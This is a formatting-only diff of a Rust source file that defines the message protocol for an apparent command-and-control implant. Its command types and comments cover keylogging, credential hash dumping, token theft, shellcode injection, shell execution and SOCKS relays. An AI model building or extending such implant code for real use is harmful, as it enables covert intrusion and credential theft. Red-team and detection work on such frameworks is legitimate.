@@ -1,8 +1,8 @@
 //! Task/response/message types and their (de)serialisation via [`crate::wire`].
 
+use crate::wire::{Reader, WireError, Writer};
 use alloc::string::String;
 use alloc::vec::Vec;
-use crate::wire::{Reader, WireError, Writer};
 
 /// Upper bound on any length-prefixed batch (tasks, responses, BOF args).
 /// Real batches are tiny (a handful of items per beacon cycle); anything past
@@ -83,13 +83,23 @@ impl SessionInfo {
 pub enum Command {
     Ping,
     /// Reschedule beaconing: sleep `seconds` (+/- `jitter_pct`%).
-    Sleep { seconds: u32, jitter_pct: u8 },
+    Sleep {
+        seconds: u32,
+        jitter_pct: u8,
+    },
     /// Run a shell command (`/bin/sh -c` / `cmd.exe /c`).
-    Shell { args: String },
+    Shell {
+        args: String,
+    },
     /// Write `data` to a file named `name` on the target (no fixed path yet).
-    Upload { name: String, data: Vec<u8> },
+    Upload {
+        name: String,
+        data: Vec<u8>,
+    },
     /// Read `path` off the target (streamed back as FileChunks).
-    Download { path: String },
+    Download {
+        path: String,
+    },
     /// Tear down the session cleanly.
     Exit,
     /// Execute a COFF/BOF object: `name` is a short entry label, `args` are
@@ -122,21 +132,34 @@ pub enum Command {
         dest: Option<String>,
     },
     /// 截屏。`monitor` 0=主屏，返回 PNG 数据（Response::Image）。
-    Screenshot { monitor: u8 },
+    Screenshot {
+        monitor: u8,
+    },
     /// 端口扫描。扫描 `host` 的 `ports`（逗号分隔，如 "22,80,443" 或 "1-1000"）。
-    Portscan { host: String, ports: String },
+    Portscan {
+        host: String,
+        ports: String,
+    },
     /// 网络信息收集（ifconfig/arp/netstat/route）。
-    Net { query: String },
+    Net {
+        query: String,
+    },
     /// 磁盘/分区信息（df/diskutil）。
     DriveInfo,
     /// 读取剪贴板内容。
     Clipboard,
     /// 环境变量收集。`name` 空=全部，否则取单个变量。
-    Env { name: String },
+    Env {
+        name: String,
+    },
     /// 键盘记录。`action` 0=start, 1=stop, 2=dump（返回已捕获的键）。
-    Keylog { action: u8 },
+    Keylog {
+        action: u8,
+    },
     /// 持续截屏（定时截图，`interval_secs` 秒一张）。
-    Screenwatch { interval_secs: u32 },
+    Screenwatch {
+        interval_secs: u32,
+    },
     /// 凭据哈希提取。`method` 语义（跨后端统一约定）：
     ///   - 0 = SAM hive（Windows，加密，需配 SYSTEM hive 离线解 NTLM）
     ///   - 1 = SYSTEM hive（Windows，boot-key 源）
@@ -144,21 +167,30 @@ pub enum Command {
     ///   - 3 = macOS shadow hash（agent-dev，读 dslocal plist）
     ///     数字 0/1 在 implant-win 上行为不变（旧 beacon 兼容）；agent-dev 的
     ///     method=1 从 shadow 改为 SYSTEM（macOS 返回 unsupported），shadow 挪到 3。
-    Hashdump { method: u8 },
+    Hashdump {
+        method: u8,
+    },
     /// Write `data` to an open relay channel's socket — the operator→implant
     /// direction of the SOCKS / rportfwd relay. `chan` is the id a prior
     /// `Connect`/`Socks` returned. Mirrors `Response::Channel { status: 1, data }`
     /// which carries bytes the OTHER way (socket→operator).
-    ChannelData { chan: u32, data: Vec<u8> },
+    ChannelData {
+        chan: u32,
+        data: Vec<u8>,
+    },
     /// Close a relay channel's socket and drop it from the implant's channel
     /// table. The implant also auto-closes on socket EOF/error (emitting
     /// `Response::Channel { status: 2 (closed) }`), so this is for explicit
     /// operator-initiated teardown.
-    ChannelClose { chan: u32 },
+    ChannelClose {
+        chan: u32,
+    },
     /// Steal (duplicate) the primary token of `pid` and hold it process-wide for
     /// later impersonation. A prior stolen/made token is closed first. Pairs with
     /// [`Command::Rev2Self`] / [`Command::GetUid`]. Lateral-movement primitive.
-    StealToken { pid: u32 },
+    StealToken {
+        pid: u32,
+    },
     /// Make a new logon token via `LogonUser` (make-token / pass-the-password).
     /// `domain`\`user` + `password`; `logon_type` 1=interactive(default),
     /// 2=network, 3=new-credentials. The resulting token is held process-wide
@@ -224,7 +256,10 @@ impl Command {
     pub fn encode(&self, w: &mut Writer) {
         match self {
             Command::Ping => w.u8(1),
-            Command::Sleep { seconds, jitter_pct } => {
+            Command::Sleep {
+                seconds,
+                jitter_pct,
+            } => {
                 w.u8(2);
                 w.u32(*seconds);
                 w.u8(*jitter_pct);
@@ -243,15 +278,15 @@ impl Command {
                 w.str(path);
             }
             Command::Exit => w.u8(6),
-    Command::Bof { name, args, blob } => {
-        w.u8(7);
-        w.str(name);
-        w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
-        for a in args.iter().take(MAX_WIRE_COUNT) {
-            w.str(a);
-        }
-        w.blob(blob);
-    }
+            Command::Bof { name, args, blob } => {
+                w.u8(7);
+                w.str(name);
+                w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
+                for a in args.iter().take(MAX_WIRE_COUNT) {
+                    w.str(a);
+                }
+                w.blob(blob);
+            }
             Command::Connect {
                 proto,
                 host,
@@ -346,7 +381,12 @@ impl Command {
             }
             Command::Rev2Self => w.u8(24),
             Command::GetUid => w.u8(25),
-            Command::Inject { method, pid, spawn_to, shellcode } => {
+            Command::Inject {
+                method,
+                pid,
+                spawn_to,
+                shellcode,
+            } => {
                 w.u8(26);
                 w.u8(*method);
                 w.u32(*pid);
@@ -397,11 +437,7 @@ impl Command {
             10 => {
                 let op = FileOp::decode(r)?;
                 let path = r.str()?;
-                let dest = if r.u8()? == 1 {
-                    Some(r.str()?)
-                } else {
-                    None
-                };
+                let dest = if r.u8()? == 1 { Some(r.str()?) } else { None };
                 Command::FileOp { op, path, dest }
             }
             11 => Command::Screenshot { monitor: r.u8()? },
@@ -414,7 +450,9 @@ impl Command {
             15 => Command::Clipboard,
             16 => Command::Env { name: r.str()? },
             17 => Command::Keylog { action: r.u8()? },
-            18 => Command::Screenwatch { interval_secs: r.u32()? },
+            18 => Command::Screenwatch {
+                interval_secs: r.u32()?,
+            },
             19 => Command::Hashdump { method: r.u8()? },
             20 => Command::ChannelData {
                 chan: r.u32()?,
@@ -435,7 +473,12 @@ impl Command {
                 let pid = r.u32()?;
                 let spawn_to = r.str()?;
                 let shellcode = r.blob()?.to_vec();
-                Command::Inject { method, pid, spawn_to, shellcode }
+                Command::Inject {
+                    method,
+                    pid,
+                    spawn_to,
+                    shellcode,
+                }
             }
             t => return Err(WireError::BadTag(t)),
         })
@@ -482,7 +525,12 @@ impl Response {
                 w.u8(3);
                 w.str(m);
             }
-            Response::FileChunk { name, seq, eof, data } => {
+            Response::FileChunk {
+                name,
+                seq,
+                eof,
+                data,
+            } => {
                 w.u8(4);
                 w.str(name);
                 w.u32(*seq);
@@ -493,11 +541,7 @@ impl Response {
                 w.u8(5);
                 w.blob(d);
             }
-            Response::Channel {
-                chan,
-                status,
-                data,
-            } => {
+            Response::Channel { chan, status, data } => {
                 w.u8(6);
                 w.u32(*chan);
                 w.u8(*status);
@@ -523,7 +567,12 @@ impl Response {
                     return Err(WireError::BadTag(eof_raw));
                 }
                 let data = r.blob()?.to_vec();
-                Response::FileChunk { name, seq, eof: eof_raw, data }
+                Response::FileChunk {
+                    name,
+                    seq,
+                    eof: eof_raw,
+                    data,
+                }
             }
             5 => Response::BofOutput(r.blob()?.to_vec()),
             6 => Response::Channel {
@@ -557,14 +606,14 @@ impl Task {
     }
 
     /// Encode a batch: `u32 count` followed by each task.
-pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
-    let mut w = Writer::new();
-    w.u32(tasks.len().min(MAX_WIRE_COUNT) as u32);
-    for t in tasks.iter().take(MAX_WIRE_COUNT) {
-        t.encode(&mut w);
+    pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
+        let mut w = Writer::new();
+        w.u32(tasks.len().min(MAX_WIRE_COUNT) as u32);
+        for t in tasks.iter().take(MAX_WIRE_COUNT) {
+            t.encode(&mut w);
+        }
+        w.into_bytes()
     }
-    w.into_bytes()
-}
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<Task>, WireError> {
         let mut r = Reader::new(data);
@@ -598,14 +647,14 @@ impl TaskResponse {
         })
     }
 
-pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
-    let mut w = Writer::new();
-    w.u32(rs.len().min(MAX_BATCH) as u32);
-    for r in rs.iter().take(MAX_BATCH) {
-        r.encode(&mut w);
+    pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
+        let mut w = Writer::new();
+        w.u32(rs.len().min(MAX_BATCH) as u32);
+        for r in rs.iter().take(MAX_BATCH) {
+            r.encode(&mut w);
+        }
+        w.into_bytes()
     }
-    w.into_bytes()
-}
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<TaskResponse>, WireError> {
         let mut r = Reader::new(data);
@@ -640,7 +689,11 @@ mod tests {
 
     #[test]
     fn fileop_mkdir_roundtrips() {
-        let cmd = Command::FileOp { op: FileOp::Mkdir, path: "/tmp/x".into(), dest: None };
+        let cmd = Command::FileOp {
+            op: FileOp::Mkdir,
+            path: "/tmp/x".into(),
+            dest: None,
+        };
         assert_eq!(round_trip(cmd.clone()), cmd);
     }
 
@@ -656,18 +709,42 @@ mod tests {
 
     #[test]
     fn fileop_all_variants_roundtrip() {
-        let ops = [FileOp::Cd, FileOp::Mkdir, FileOp::Rm, FileOp::Mv, FileOp::Cp];
+        let ops = [
+            FileOp::Cd,
+            FileOp::Mkdir,
+            FileOp::Rm,
+            FileOp::Mv,
+            FileOp::Cp,
+        ];
         for op in ops {
-            let cmd = Command::FileOp { op, path: "p".into(), dest: Some("d".into()) };
-            assert_eq!(round_trip(cmd.clone()), cmd, "FileOp::{op:?} roundtrip 失败");
+            let cmd = Command::FileOp {
+                op,
+                path: "p".into(),
+                dest: Some("d".into()),
+            };
+            assert_eq!(
+                round_trip(cmd.clone()),
+                cmd,
+                "FileOp::{op:?} roundtrip 失败"
+            );
         }
     }
 
     #[test]
     fn connect_and_socks_still_roundtrip() {
-        let connect = Command::Connect { proto: 0, host: "10.0.0.1".into(), port: 445, chan: 7 };
+        let connect = Command::Connect {
+            proto: 0,
+            host: "10.0.0.1".into(),
+            port: 445,
+            chan: 7,
+        };
         assert_eq!(round_trip(connect.clone()), connect);
-        let socks = Command::Socks { chan: 7, op: 1, addr: "127.0.0.1".into(), port: 8080 };
+        let socks = Command::Socks {
+            chan: 7,
+            op: 1,
+            addr: "127.0.0.1".into(),
+            port: 8080,
+        };
         assert_eq!(round_trip(socks.clone()), socks);
     }
 
@@ -678,7 +755,10 @@ mod tests {
         w.u8(99);
         let bytes = w.into_bytes();
         let mut r = Reader::new(&bytes);
-        assert!(matches!(Command::decode(&mut r), Err(WireError::BadTag(99))));
+        assert!(matches!(
+            Command::decode(&mut r),
+            Err(WireError::BadTag(99))
+        ));
     }
 
     #[test]
@@ -691,19 +771,28 @@ mod tests {
 
     #[test]
     fn portscan_roundtrips() {
-        let cmd = Command::Portscan { host: "10.0.0.0/24".into(), ports: "22,80,443".into() };
+        let cmd = Command::Portscan {
+            host: "10.0.0.0/24".into(),
+            ports: "22,80,443".into(),
+        };
         assert_eq!(round_trip(cmd.clone()), cmd);
     }
 
     #[test]
     fn net_driveinfo_clipboard_env_roundtrip() {
-        let net = Command::Net { query: "ifconfig".into() };
+        let net = Command::Net {
+            query: "ifconfig".into(),
+        };
         assert_eq!(round_trip(net.clone()), net);
         assert_eq!(round_trip(Command::DriveInfo), Command::DriveInfo);
         assert_eq!(round_trip(Command::Clipboard), Command::Clipboard);
-        let env = Command::Env { name: "PATH".into() };
+        let env = Command::Env {
+            name: "PATH".into(),
+        };
         assert_eq!(round_trip(env.clone()), env);
-        let env_all = Command::Env { name: String::new() };
+        let env_all = Command::Env {
+            name: String::new(),
+        };
         assert_eq!(round_trip(env_all.clone()), env_all);
     }
 
@@ -741,7 +830,10 @@ mod tests {
         };
         assert_eq!(round_trip(d.clone()), d);
         // Empty data is a valid (if useless) write — encode/decode must handle it.
-        let d_empty = Command::ChannelData { chan: 7, data: Vec::new() };
+        let d_empty = Command::ChannelData {
+            chan: 7,
+            data: Vec::new(),
+        };
         assert_eq!(round_trip(d_empty.clone()), d_empty);
         let c = Command::ChannelClose { chan: 42 };
         assert_eq!(round_trip(c.clone()), c);
